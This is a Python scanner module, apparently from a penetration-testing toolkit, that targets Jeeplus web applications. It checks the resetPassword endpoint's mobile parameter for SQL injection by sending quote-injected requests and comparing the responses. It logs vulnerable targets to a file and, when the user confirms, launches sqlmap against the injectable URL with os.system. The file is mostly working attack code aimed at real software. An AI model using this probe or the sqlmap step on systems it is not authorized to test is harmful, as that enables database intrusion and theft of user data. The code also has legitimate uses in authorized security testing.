#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3,re
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile

urllib3.disable_warnings()
class Jeeplus_Reset_Password_Scan:
    def get_url(self,baseurl):
        try:
            response = requests.get(baseurl, headers=self.headers, verify=self.ssl,proxies=self.proxy, timeout=15)
            try:
                path = re.findall(baseurl + '(.+?)/login', response.url)[0]
            except:
                path = 'a'
            url = baseurl + f"{path}/sys/user/resetPassword?&mobile=13888888888"
            response1 = requests.get(url, headers=self.headers, verify=self.ssl,proxies=self.proxy, timeout=15)
            # print(response1.text)
            url = baseurl + f"{path}/sys/user/resetPassword?&mobile=13888888888'"
            response2 = requests.get(url, headers=self.headers, verify=self.ssl,proxies=self.proxy, timeout=15)
            url = baseurl + f"{path}/sys/user/resetPassword?&mobile=13888888888''"
            # print(url)
            response3 = requests.get(url, headers=self.headers, verify=self.ssl,proxies=self.proxy, timeout=15)
            if response1.text == response3.text and response1.text != response2.text:
                if not self.batch:
                    OutPrintInfoSuc("Jeeplus", '目标存在Jeeplus-resetPassword SQL漏洞')
                    OutPrintInfo("Jeeplus", url)
                else:
                    OutPrintInfoSuc("Jeeplus", f'目标存在Jeeplus-resetPassword SQL漏洞: {url}')
                    OutPutFile("jeeplus_resetpassword_sql.txt",f'目标存在Jeeplus-resetPassword SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfoSuc("Jeeplus", '目标不存在Jeeplus-resetPassword SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Jeeplus",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Jeeplus", '开始检测Jeeplus-resetPassword SQL漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/a/sys/user/resetPassword?&mobile=*" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/a/sys/user/resetPassword?&mobile=*\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Jeeplus", 'Jeeplus-resetPassword SQL漏洞检测结束')

